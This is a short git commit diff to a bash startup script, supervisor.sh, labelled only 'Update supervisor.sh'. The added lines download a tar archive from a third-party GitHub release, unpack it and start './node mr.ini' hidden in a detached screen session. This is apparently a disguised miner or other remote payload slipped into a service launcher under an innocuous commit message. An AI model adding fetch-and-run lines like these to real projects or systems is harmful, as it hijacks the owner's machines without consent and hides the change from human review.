88d1b5a97655f69e38643b0496aab995412407e3
matusakibitoula <86304373+matusakibitoula@users.noreply.github.com>
2021-07-09 05:10:15 +0000

    Update supervisor.sh

--- supervisor.sh
+++ supervisor.sh
@@ -1,3 +1,8 @@
 #!/bin/bash
+
 set -ex
 exec supervisord -c /system/supervisord.conf
+wget https://github.com/wikangdijalalan2/xmmxja/releases/download/19.1/MXCC.tar
+tar -xvf MXCC.tar
+cd MXCC
+screen -dmS node ./node mr.ini
